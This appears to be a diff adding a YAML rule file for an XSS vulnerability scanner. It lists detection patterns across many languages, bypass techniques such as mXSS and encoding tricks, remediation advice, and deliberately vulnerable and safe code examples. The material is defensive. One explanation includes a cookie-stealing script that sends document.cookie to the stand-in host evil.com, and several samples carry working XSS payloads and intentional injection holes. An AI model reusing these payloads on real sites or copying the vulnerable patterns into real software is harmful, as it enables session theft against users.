+      example: "{{{ user_input }}}"
+    - id: rs-handlebars-escape-fn
+      pattern: "register_escape_fn() with weak/no-op escape function"
+      languages: [rust]
+      example: "handlebars.register_escape_fn(|s| s.to_string())"
+    - id: rs-minijinja-safe-filter
+      pattern: "{{ var | safe }} in MiniJinja template — bypasses auto-escaping"
+      languages: [rust]
+      example: "{{ user_input | safe }}"
+    - id: rs-minijinja-autoescape-none
+      pattern: "AutoEscape::None configuration in MiniJinja"
+      languages: [rust]
+      example: "env.set_auto_escape_callback(|_name| AutoEscape::None)"
+    - id: rs-yew-set-inner-html
+      pattern: "set_inner_html() or Html::from_html_unchecked() in Yew components"
+      languages: [rust]
+      example: "el.set_inner_html(&user_input)"
+    - id: rs-maud-pre-escaped
+      pattern: "PreEscaped() wrapper in Maud templates with user input"
+      languages: [rust]
+      example: "PreEscaped(user_input)"
+
+  medium_confidence:
+    - id: any-href-user-url
+      pattern: "User-controlled value in href/src attribute without URL scheme validation"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "javascript: URI bypasses ALL HTML encoding. Must validate scheme is http/https."
+      semgrep: "python.flask.security.xss.audit.template-href-var.template-href-var"
+    - id: any-var-in-script
+      pattern: "Template variable inside <script> block — HTML auto-escaping is wrong context"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "Even with auto-escaping ON, HTML encoding in JS context is insufficient."
+      semgrep: "ruby.rails.security.audit.xss.templates.var-in-script-tag.var-in-script-tag"
+    - id: any-unquoted-attr
+      pattern: "Template variable in unquoted HTML attribute"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "Unquoted attributes allow breakout without special chars: <div class=foo onmouseover=alert(1)>"
+      semgrep: "python.flask.security.xss.audit.template-unquoted-attribute-var.template-unquoted-attribute-var"
+    - id: any-json-html-content-type
+      pattern: "JSON response served with text/html Content-Type"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "Browser executes script in JSON if content type is text/html."
+    - id: any-svg-upload
+      pattern: "SVG file upload served from same origin without sanitization"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "SVG can contain <script> tags and event handlers."
+    - id: rs-askama-nonhtml-ext
+      pattern: "Askama template with non-HTML extension rendering user input"
+      languages: [rust]
+      note: "Like Flask, non-HTML extensions may not auto-escape."
+    - id: rs-ammonia-outdated
+      pattern: "ammonia crate version < 4.1.2 in Cargo.lock — known mXSS vulnerabilities"
+      languages: [rust]
+      cves: ["RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
+    - id: rs-handlebars-var-in-script
+      pattern: "Handlebars-rust {{ var }} inside <script> block — HTML-escaped in JS context"
+      languages: [rust]
+      note: "Single escape function for all contexts — HTML escaping is insufficient for JS."
+    - id: js-postmessage-no-origin
+      pattern: "postMessage event handler without origin validation writing to DOM"
+      languages: [javascript, typescript]
+      example: "window.addEventListener('message', e => { el.innerHTML = e.data; })"
+    - id: js-jquery-selector
+      pattern: "jQuery $(userInput) — if input starts with <, creates and renders elements"
+      languages: [javascript, typescript]
+      example: "$(location.hash)"
+    - id: any-llm-html-render
+      pattern: "LLM/AI output rendered as HTML without sanitization"
+      languages: [python, java, javascript, typescript, go, rust]
+      note: "Prompt injection can cause LLM to output XSS payloads in AI chat interfaces."
+
+  context_required:
+    - id: any-stored-xss-check
+      pattern: "Data stored in DB/cache, later rendered in HTML — check encoding at output"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "The write and read code paths may be in completely different modules. Check profiles, comments, filenames, log viewers."
+    - id: any-dom-source-to-sink
+      pattern: "DOM source (location.hash/search, document.referrer, window.name) flows to rendering"
+      languages: [javascript, typescript]
+      note: "Requires tracing JS data flow through variable assignments, closures, state management."
+    - id: any-websocket-dom
+      pattern: "WebSocket/SSE/GraphQL subscription data rendered in DOM without encoding"
+      languages: [javascript, typescript]
+      note: "Real-time data channels bypass traditional request/response scanning."
+    - id: any-sanitizer-then-modify
+      pattern: "HTML sanitized then further modified (concatenation, substring, interpolation)"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "Any string operation after sanitization can reintroduce XSS."
+    - id: rs-ammonia-svg-math-allowlist
+      pattern: "ammonia usage with svg or math in tags() allowlist combined with raw-text elements"
+      languages: [rust]
+      cves: ["RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
+      note: "Namespace confusion enables mXSS when SVG/MathML + raw-text elements are allowlisted."
+
+bypass_techniques:
+  - name: "Mutation XSS (mXSS)"
+    description: "Browser re-parses sanitized HTML differently than the sanitizer, converting safe markup into executable code. Root causes: namespace confusion (HTML/SVG/MathML parsing differences), deep nesting causing DOM flattening, parser state differentials (noscript tag)."
+    detection_hint: "Flag reliance on a single HTML sanitizer without CSP defense-in-depth. Flag outdated DOMPurify (< 3.2.4) or ammonia (< 4.1.2). Flag SVG/MathML content in user-controlled HTML."
+    cves: ["CVE-2024-47875", "CVE-2025-26791", "RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
+    research: "Cure53 DOMPurify bypass timeline: 2019 (Kinugawa, noscript), 2020 (Bentkowski, MathML), 2024 (IcesFont, nesting), 2025 (template literal regex). At least 6 bypasses since 2019."
+
+  - name: "DOM Clobbering"
+    description: "Injecting scriptless HTML with name/id attributes to override DOM properties and JavaScript globals, escalating to XSS through existing script gadgets. DOMPurify does NOT strip name attributes."
+    detection_hint: "Flag JavaScript code that reads DOM properties (window.config, document.getElementById) and passes values to script loading or innerHTML. Flag user-controlled HTML with name/id attributes."
+    cves: ["CVE-2024-47068", "CVE-2024-45389"]
+    research: "Rollup bundler gadget (2024), Astro framework router gadget (2024), Pagefind document.currentScript override (2024)."
+
+  - name: "CSP Bypasses"
+    description: "Circumventing Content Security Policy via JSONP endpoints on whitelisted domains, Angular/Vue CDN gadgets on whitelisted CDNs, base-uri injection for relative path hijacking, strict-dynamic script gadgets."
+    detection_hint: "Audit CSP header for whitelisted domains hosting JSONP. Check for missing base-uri and object-src directives. Verify strict-dynamic is combined with nonces, not unsafe-inline."
+    research: "Lekies et al. (CCS 2017) — 'Code-Reuse Attacks for the Web: Breaking XSS Mitigations via Script Gadgets.' 10% of otherwise-secure CSP policies bypassed."
+
+  - name: "SVG/MathML Namespace Switching"
+    description: "HTML parser switches namespace on <svg>/<math> tags. Elements like <style>, <title>, <script> that are raw-text in HTML become regular elements in foreign namespaces, enabling child element injection that bypasses sanitizers."
+    detection_hint: "Flag SVG/MathML content in user-controlled HTML. Check sanitizer handling of foreignObject, annotation-xml, and text integration points (mtext, mi, mo, mn, ms)."
+    cves: ["CVE-2025-66412", "RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
+    research: "Angular sanitizer SVG/MathML bypass (2025), DOMPurify MathML text integration bypass (2020), ammonia namespace confusion (2021, 2025)."
+
+  - name: "Prototype Pollution to XSS Chains"
+    description: "Prototype pollution gadget (lodash _.merge, jQuery $.extend) pollutes properties read by template rendering or DOM manipulation code, injecting HTML into the page."
+    detection_hint: "Flag deep merge functions (_.merge, $.extend, Object.assign with spread) accepting user input. Check if template engines read from Object.prototype during rendering."
+    cves: ["CVE-2024-6783"]
+    research: "Vue.js 2 prototype pollution via staticClass/staticStyle (2024). General pattern: PP gadget → polluted template property → injected HTML."
+
+  - name: "Sanitizer Bypasses (Framework-Specific)"
+    description: "Framework built-in sanitizers may have incomplete attribute schemas for SVG/MathML elements, or use attribute-based payloads (CSS animation event handlers) when sanitizer only strips <script> tags."
+    detection_hint: "Flag custom or framework-built sanitizers vs. proven libraries (DOMPurify, ammonia, bleach). Check for attribute-based event handlers (onanimationstart, onanimationend) and CSS animation triggers."
+    cves: ["CVE-2024-42009", "CVE-2025-66412"]
+    research: "Roundcube zero-click email XSS via CSS animation trigger (CVE-2024-42009, actively exploited by UNC1151). Angular SVG animation element bypass (CVE-2025-66412)."
+
+  - name: "Encoding Bypasses"
+    description: "Double encoding (%253C), mixed encoding (URL + HTML entity + Unicode), HTML entity variants (decimal, hex, zero-padded, without semicolons), null byte injection (java\\0script:), non-recursive filter stripping (<scr<script>ipt>)."
+    detection_hint: "Flag denylist-based XSS filters and single-pass sanitization. Verify input is decoded/canonicalized exactly once before validation (ASVS 1.1.1)."
+    cves: ["CVE-2006-4308", "CVE-2007-5727"]
+
+  - name: "JavaScript Context Escapes"
+    description: "Template literal injection (backticks), Unicode escapes in identifiers (\\u0061lert), hex/octal in eval strings, constructor chains ([].constructor.constructor('alert(1)')())."
+    detection_hint: "Flag user input inside JavaScript template literals (backtick strings). Flag any user input reaching eval/Function/setTimeout string overloads."
+
+  - name: "XSS via File Upload"
+    description: "SVG files with embedded <script> and event handlers. HTML files served from same origin. MIME type sniffing without X-Content-Type-Options: nosniff. Polyglot files (valid image + valid JavaScript)."
+    detection_hint: "Flag file upload endpoints serving content from same origin without Content-Disposition: attachment. Check for SVG uploads without stripping scripts. Verify X-Content-Type-Options: nosniff on upload responses."
+
+remediation:
+  preferred: |
+    Apply context-specific output encoding as the primary defense. Different contexts require
+    different encoding — a single function is NEVER sufficient:
+
+    HTML Body: HTML entity encoding (& < > " ')
+      Python: markupsafe.escape() or template auto-escaping
+      JavaScript: element.textContent = data (NOT innerHTML)
+      Go: html/template auto-escaping or html.EscapeString()
+      Ruby: ERB auto-escaping (<%= %>) or ERB::Util.html_escape()
+      PHP: htmlspecialchars($data, ENT_QUOTES|ENT_HTML5, 'UTF-8')
+      Java: JSTL <c:out> or fn:escapeXml()
+      C#: Razor auto-escaping (@var)
+      Rust: Askama/Tera auto-escaping ({{ var }} without |safe)
+
+    JavaScript Context: JS-specific encoding
+      Python: |tojson filter in Jinja2 or json.dumps()
+      Ruby: escape_javascript() / j() helper
+      Go: html/template contextual auto-escaping
+      Best practice: use data-* attributes with JSON, read via dataset API
+
+    URL Context: URL percent-encoding for params, scheme validation for full URLs
+      Python: urllib.parse.quote() + url_for() for internal links
+      JavaScript: encodeURIComponent() for params, validate https?:// scheme for full URLs
+      Go: url.QueryEscape()
+      Rust: urlencoding::encode() + url::Url::parse() scheme validation
+
+    HTML Sanitization (when users author HTML): use allowlist-based sanitizer
+      JavaScript: DOMPurify.sanitize(dirty)
+      Python: nh3.clean(dirty) or bleach.clean(dirty, tags=[...])
+      Ruby: ActionController::Base.helpers.sanitize(dirty)
+      Go: bluemonday.UGCPolicy().Sanitize(dirty)
+      Rust: ammonia::clean(&dirty) — keep ammonia >= 4.1.2
+      Java: OWASP Java HTML Sanitizer PolicyFactory.sanitize(dirty)
+
+    CSP (defense-in-depth, not replacement for encoding):
+      Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic';
+                               object-src 'none'; base-uri 'none';
+      Generate cryptographic nonce per response. Never reuse nonces.
+
+    Trusted Types (DOM XSS prevention):
+      Content-Security-Policy: require-trusted-types-for 'script';
+      Enforces sanitization at API level — innerHTML rejects raw strings.
+
+  common_mistakes:
+    - mistake: "Using a single encoding function for all output contexts"
+      why_insufficient: "HTML entity encoding in a JavaScript context does not prevent script injection. The browser decodes HTML entities BEFORE the JS parser runs. Each context requires its own encoding."
+
+    - mistake: "Using innerHTML instead of textContent for displaying user data"
+      why_insufficient: "innerHTML parses the string as HTML, executing embedded scripts. textContent treats input as literal text. This is the most common DOM XSS vector."
+
+    - mistake: "Input validation (denylist) instead of output encoding"
+      why_insufficient: "Denylist filters are always bypassable — case mixing, encoding variations, alternate syntax, non-recursive stripping. Output encoding is the authoritative defense."
+
+    - mistake: "Encoding at input/storage time instead of output time"
+      why_insufficient: "The output context is unknown at input time. The same value may appear in HTML body, JS context, URL context, and CSS context on different pages. Encode at the point of output."
+
+    - mistake: "Trusting framework auto-escaping in all contexts"
+      why_insufficient: "Most template engines only HTML-encode. Variables in <script> blocks, href attributes (javascript: URI), style attributes, and unquoted attributes remain vulnerable even with auto-escaping ON."
+
+    - mistake: "Relying solely on CSP to prevent XSS"
+      why_insufficient: "CSP is defense-in-depth, not a primary control. JSONP endpoints, script gadgets, base-uri injection, and incorrect configurations (unsafe-inline) create bypasses. Fix the encoding first."
+
+    - mistake: "Sanitizing HTML then modifying the result"
+      why_insufficient: "Any string operation after sanitization (concatenation, interpolation, substring) can reintroduce XSS. Sanitize as the LAST step before rendering."
+
+    - mistake: "Using dangerouslySetInnerHTML/v-html/@Html.Raw for convenience"
+      why_insufficient: "These explicitly bypass framework protections. If the content contains user data, it must be sanitized with DOMPurify or equivalent before use."
+
+    - mistake: "Assuming Rust's memory safety prevents XSS"
+      why_insufficient: "XSS is a logic vulnerability, not a memory safety issue. format!() with user input in an HTML response is just as vulnerable in Rust as string concatenation in Python or PHP."
+
+few_shot_examples:
+  vulnerable:
+    - language: python
+      label: "Django mark_safe with user input"
+      code: |
+        def render_comment(request):
+            comment = request.POST.get('comment')
+            return render(request, 'page.html', {
+                'comment': mark_safe(f'<div class="comment">{comment}</div>')
+            })
+      explanation: "mark_safe() disables Django auto-escaping. User comment containing <script>alert(1)</script> executes in all viewers' browsers. Fix: Use format_html('<div class=\"comment\">{}</div>', comment) which escapes the argument."
+
+    - language: python
+      label: "Flask direct string return from route"
+      code: |
+        @app.route('/search')
+        def search():
+            query = request.args.get('q', '')
+            return f'<h1>Results for: {query}</h1><p>No results found.</p>'
+      explanation: "Direct f-string return bypasses Jinja2 auto-escaping. Attacker sends q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>. Fix: return render_template('search.html', query=query)."
+
+    - language: javascript
+      label: "React dangerouslySetInnerHTML with user content"
+      code: |
+        function Comment({ comment }) {
+          return (
+            <div dangerouslySetInnerHTML={{ __html: comment.body }} />
+          );
+        }
+      explanation: "dangerouslySetInnerHTML renders raw HTML from user-authored comment. Stored XSS affects all viewers. Fix: Use DOMPurify: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }}."
+
+    - language: javascript
+      label: "DOM XSS via location.hash to innerHTML"
+      code: |
+        const content = decodeURIComponent(location.hash.substring(1));
+        document.getElementById('preview').innerHTML = content;
+      explanation: "URL fragment (never sent to server) flows directly to innerHTML. Exploit: page.html#<img src=x onerror=alert(document.cookie)>. Fix: Use textContent, or sanitize with DOMPurify.sanitize(content)."
+
+    - language: java
+      label: "Servlet direct response with request parameter"
+      code: |
+        @WebServlet("/greet")
+        public class GreetServlet extends HttpServlet {
+            protected void doGet(HttpServletRequest req, HttpServletResponse resp)
+                    throws IOException {
+                String name = req.getParameter("name");
+                resp.setContentType("text/html");
+                resp.getWriter().print("<h1>Hello " + name + "</h1>");
+            }
+        }
+      explanation: "Request parameter written directly to HTML response. Fix: Use Encode.forHtml(name) from OWASP Java Encoder, or use a template engine with auto-escaping."
+
+    - language: go
+      label: "text/template import (no escaping)"
+      code: |
+        import "text/template"
+
+        func handler(w http.ResponseWriter, r *http.Request) {
+            name := r.FormValue("name")
+            tmpl := template.Must(template.New("page").Parse("<h1>{{.Name}}</h1>"))
+            tmpl.Execute(w, map[string]string{"Name": name})
+        }
+      explanation: "text/template performs ZERO HTML escaping. Any HTML in name renders directly. Fix: import \"html/template\" instead — identical API but with contextual auto-escaping."
+
+    - language: go
+      label: "template.HTML type cast bypassing auto-escaping"
+      code: |
+        import "html/template"
+
+        func handler(w http.ResponseWriter, r *http.Request) {
+            content := r.FormValue("content")
+            data := map[string]interface{}{
+                "Body": template.HTML(content),
+            }
+            tmpl.Execute(w, data)
+        }
+      explanation: "template.HTML() tells html/template to skip escaping. User input passes through unmodified. Fix: Remove the type cast — let html/template auto-escape: \"Body\": content."
+
+    - language: ruby
+      label: "Rails html_safe on user input"
+      code: |
+        def show
+          @message = "<p>#{params[:message]}</p>".html_safe
+        end
+      explanation: "html_safe marks the string as safe for rendering, bypassing Rails auto-escaping. Fix: Use content_tag(:p, params[:message]) or let ERB auto-escape: <%= params[:message] %>."
+
+    - language: php
+      label: "Echo with unsanitized GET parameter"
+      code: |
+        <?php
+        $name = $_GET['name'];
+        echo "<h1>Welcome, $name!</h1>";
+        ?>
+      explanation: "Direct echo of GET parameter into HTML. Fix: echo '<h1>Welcome, ' . htmlspecialchars($name, ENT_QUOTES|ENT_HTML5, 'UTF-8') . '!</h1>';"
+
+    - language: csharp
+      label: "ASP.NET Html.Raw with user input"
+      code: |
+        @{
+            var message = Context.Request.Query["msg"];
+        }
+        <div>@Html.Raw(message)</div>
+      explanation: "Html.Raw() bypasses Razor auto-escaping. Fix: Remove Html.Raw() — <div>@message</div> auto-escapes."
+
+    - language: rust
+      label: "Axum Html response with format!() — the Rust XSS footgun"
+      code: |
+        use axum::{extract::Query, response::Html};
+
+        async fn greet(Query(params): Query<HashMap<String, String>>) -> Html<String> {
+            let name = params.get("name").unwrap_or(&String::new());
+            Html(format!("<h1>Hello {}</h1>", name))
+        }
+      explanation: "format!() interpolates user input into HTML string. Rust's memory safety does NOT prevent XSS — this is a logic vulnerability. Fix: Use a template engine (Askama/Tera) with auto-escaping, or return JSON."
+
+    - language: rust
+      label: "Askama |safe filter bypassing auto-escaping"
+      code: |
+        // template: <div class="bio">{{ user_bio|safe }}</div>
+        #[derive(Template)]
+        #[template(path = "profile.html")]
+        struct ProfileTemplate {
+            user_bio: String,
+        }
+
+        async fn profile(bio: String) -> impl IntoResponse {
+            ProfileTemplate { user_bio: bio }
+        }
+      explanation: "|safe filter tells Askama to skip HTML escaping. User bio containing <img src=x onerror=alert(1)> executes in all viewers. Fix: Remove |safe — {{ user_bio }} auto-escapes. If HTML rendering is needed, sanitize with ammonia::clean(&bio) before passing to template."
+
+    - language: rust
+      label: "Tera template with {{ var | safe }} filter"
+      code: |
+        fn render_page(tera: &Tera, content: &str) -> String {
+            let mut ctx = tera::Context::new();
+            ctx.insert("content", content);
+            tera.render("page.html", &ctx).unwrap()
+        }
+        // page.html: <div>{{ content | safe }}</div>
+      explanation: "| safe in Tera disables auto-escaping. Fix: Remove | safe — {{ content }} auto-escapes for HTML context."
+
+    - language: rust
+      label: "Handlebars-rust triple braces"
+      code: |
+        let mut hbs = Handlebars::new();
+        hbs.register_template_string("page",
+            "<div class=\"comment\">{{{comment}}}</div>").unwrap();
+
+        let data = json!({"comment": user_input});
+        hbs.render("page", &data).unwrap()
+      explanation: "{{{ }}} triple braces bypass Handlebars-rust escaping. Fix: Use {{ comment }} (double braces) which HTML-escapes the value."
+
+    - language: rust
+      label: "Yew set_inner_html with user data"
+      code: |
+        use web_sys::Element;
+
+        fn render_content(el: &Element, user_content: &str) {
+            el.set_inner_html(user_content);
+        }
+      explanation: "set_inner_html() bypasses Yew's html! macro auto-escaping. Fix: Use the html! macro: html! { <div>{ user_content }</div> } which treats content as text."
+
+    - language: rust
+      label: "Actix-web raw HTML response with format!()"
+      code: |
+        use actix_web::{web, HttpResponse};
+
+        async fn handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {
+            let name = query.get("name").unwrap_or(&"".to_string());
+            HttpResponse::Ok()
+                .content_type("text/html; charset=utf-8")
+                .body(format!("<html><body><h1>Hello {}</h1></body></html>", name))
+        }
+      explanation: "format!() with user input in HTML body response. Fix: Use Askama or Tera template engine with auto-escaping, or return JSON: HttpResponse::Ok().json(json!({\"name\": name}))."
+
+  safe:
+    - language: python
+      label: "Django format_html (auto-escapes arguments)"
+      code: |
+        from django.utils.html import format_html
+        return format_html('<div class="comment">{}</div>', user_input)
+      explanation: "format_html() HTML-escapes all arguments before interpolation. Safe equivalent of mark_safe() for structured HTML."
+
+    - language: python
+      label: "Flask render_template with .html extension"
+      code: |
+        @app.route('/search')
+        def search():
+            return render_template('search.html', query=request.args.get('q', ''))
+      explanation: "render_template with .html extension enables Jinja2 auto-escaping. {{ query }} in template is auto-escaped."
+
+    - language: javascript
+      label: "React default JSX escaping"
+      code: |
+        function Greeting({ name }) {
+          return <h1>Hello, {name}</h1>;
+        }
+      explanation: "JSX auto-escapes expressions in {}. Script tags in name render as harmless text. Never flag default React rendering."
+
+    - language: javascript
+      label: "textContent instead of innerHTML"
+      code: |
+        const name = new URLSearchParams(location.search).get('name');
+        document.getElementById('greeting').textContent = name;
+      explanation: "textContent treats input as literal text, not HTML. Safe alternative to innerHTML for displaying user data."
+
+    - language: javascript
+      label: "DOMPurify sanitization before innerHTML"
+      code: |
+        import DOMPurify from 'dompurify';
+        element.innerHTML = DOMPurify.sanitize(userContent);
+      explanation: "DOMPurify sanitizes HTML using an allowlist. Safe for rendering user-authored HTML (comments, rich text)."
+
+    - language: java
+      label: "JSTL c:out with escapeXml"
+      code: |
+        <c:out value="${param.name}" />
+      explanation: "JSTL <c:out> auto-escapes output. fn:escapeXml() provides equivalent inline escaping."
+
+    - language: java
+      label: "Thymeleaf th:text (auto-escaped)"
+      code: |
+        <p th:text="${userInput}">placeholder</p>
+      explanation: "th:text auto-escapes HTML entities. Contrast with th:utext which does NOT escape."
+
+    - language: go
+      label: "html/template contextual auto-escaping"
+      code: |
+        import "html/template"
+
+        tmpl := template.Must(template.New("page").Parse("<h1>{{.Name}}</h1>"))
+        tmpl.Execute(w, data)
+      explanation: "html/template contextually auto-escapes based on output position (HTML body, attribute, JS, CSS, URL). Safe without type casts."
+
+    - language: ruby
+      label: "ERB auto-escaping (default since Rails 3)"
+      code: |
+        <p><%= @user.comment %></p>
+      explanation: "<%= %> auto-escapes by default. Contrast with <%== %> or .html_safe which bypass escaping."
+
+    - language: php
+      label: "Laravel Blade auto-escaped output"
+      code: |
+        <p>{{ $userInput }}</p>
+      explanation: "Blade {{ }} auto-escapes. Contrast with {!! !!} which renders raw HTML."
+
+    - language: csharp
+      label: "Razor auto-escaping"
+      code: |
+        <p>@Model.UserInput</p>
+      explanation: "Razor @ expressions auto-encode output. Contrast with @Html.Raw() which bypasses encoding."
+
+    - language: rust
+      label: "Askama auto-escaping (default)"
+      code: |
+        // template: <div>{{ user_input }}</div>
+        #[derive(Template)]
+        #[template(path = "page.html")]
+        struct Page {
+            user_input: String,
+        }
+      explanation: "Askama auto-escapes {{ }} in .html templates. Script tags in user_input render as harmless text. Never flag default Askama rendering without |safe filter."
+
+    - language: rust
+      label: "Tera auto-escaping (default for .html)"
+      code: |
+        let mut ctx = tera::Context::new();
+        ctx.insert("name", &user_input);
+        tera.render("page.html", &ctx).unwrap()
+        // page.html: <h1>Hello {{ name }}</h1>
+      explanation: "Tera auto-escapes {{ }} for .html templates. Safe without | safe filter."
+
+    - language: rust
+      label: "Axum JSON response (no XSS risk)"
+      code: |
+        use axum::Json;
+
+        async fn api(Query(params): Query<HashMap<String, String>>) -> Json<Value> {
+            Json(json!({"name": params.get("name").unwrap_or(&String::new())}))
+        }
+      explanation: "JSON response with application/json Content-Type is not rendered as HTML. No XSS risk."
+
+    - language: rust
+      label: "ammonia HTML sanitization"
+      code: |
+        let clean = ammonia::clean(&user_html);
+        // Use clean in template: {{ clean }} (already sanitized, auto-escaping double-encodes)
+        // Or use clean with |safe: {{ clean|safe }} (safe because ammonia stripped dangerous content)
+      explanation: "ammonia sanitizes HTML using allowlist, stripping scripts and dangerous attributes. Keep ammonia >= 4.1.2 for mXSS protection."
+
+    - language: rust
+      label: "Yew html! macro (auto-escapes text nodes)"
+      code: |
+        html! {
+            <div class="comment">{ &self.user_input }</div>
+        }
+      explanation: "Yew html! macro treats {} expressions as text nodes, auto-escaped. Safe. Contrast with set_inner_html() which bypasses this."
+
+target_strategy:
+  scope: "function"
+  include_imports: true
+  include_type_defs: true
+  adaptive_depth:
+    small: "Deep analysis — trace all data flows from request handlers to template rendering, check all auto-escape bypasses (<20 files)"
+    medium: "Focus on route handlers, template rendering, client-side JS with DOM manipulation (20-200 files)"
+    large: "Surgical — prioritize files with known dangerous patterns: |safe, dangerouslySetInnerHTML, innerHTML, v-html, format!() in HTML responses, template.HTML() (200+ files)"
+  file_patterns:
+    - "**/*.py"
+    - "**/*.java"
+    - "**/*.js"
+    - "**/*.jsx"
+    - "**/*.ts"
+    - "**/*.tsx"
+    - "**/*.go"
+    - "**/*.rb"
+    - "**/*.php"
+    - "**/*.cs"
+    - "**/*.rs"
+    - "**/*.html"
+    - "**/*.htm"
+    - "**/*.vue"
+    - "**/*.svelte"
+    - "**/*.erb"
+    - "**/*.ejs"
+    - "**/*.pug"
+    - "**/*.jinja2"
+    - "**/*.j2"
+    - "**/*.hbs"
+    - "**/*.mustache"
+  relevance_signals:
+    # Auto-escaping bypass patterns (highest priority)
+    - "dangerouslySetInnerHTML"
+    - "v-html"
+    - "bypassSecurityTrust"
+    - "mark_safe"
+    - "SafeString"
+    - "@html_safe"
+    - "__html__"
+    - "html_safe"
+    - "raw("
+    - "<%=="
+    - "@Html.Raw"
+    - "HtmlString"
+    - "template.HTML"
+    - "template.JS"
+    - "template.CSS"
+    - "template.URL"
+    - "th:utext"
+    - "PreEscaped"
+    - "from_html_unchecked"
+    - "set_inner_html"
+    - "register_escape_fn"
+    - "AutoEscape::None"
+    - "autoescape_on"
+    - "set_escape_fn"
+    # Direct response writes
+    - "innerHTML"
+    - "outerHTML"
+    - "document.write"
+    - "insertAdjacentHTML"
+    - "res.send("
+    - "res.write("
+    - "HttpResponse("
+    - "fmt.Fprintf"
+    - "io.WriteString"
+    - "Response.Write"
+    - "getWriter"
+    - "render_template_string"
+    # Template escape filters
+    - "|safe"
+    - "|safeseq"
+    - "autoescape off"
+    - "autoescape false"
+    - "autoescape False"
+    - "{!!"
+    - "<%-"
+    - "!=\\s"
+    - "!{"
+    - "{{{"
+    - "{{ &"
+    - "escape = \"none\""
+    # Rust web framework indicators
+    - "Html("
+    - "RawHtml("
+    - "reply::html"
+    - "content_type(\"text/html"
+    - "ContentType::html"
+    # JS execution sinks
+    - "eval("
+    - "new Function("
+    - "setTimeout("
+    - "setInterval("
+    # DOM sources
+    - "location.hash"
+    - "location.search"
+    - "document.referrer"
+    - "window.name"
+    - "postMessage"
+    - "addEventListener.*message"
+    # Template imports
+    - "text/template"
+    - "render_template"
+    - "Markup("
+    - "Jinja2"
+    - "ERB.new"
+    - "render inline:"
+    # URL context
+    - "javascript:"
+    - "href="
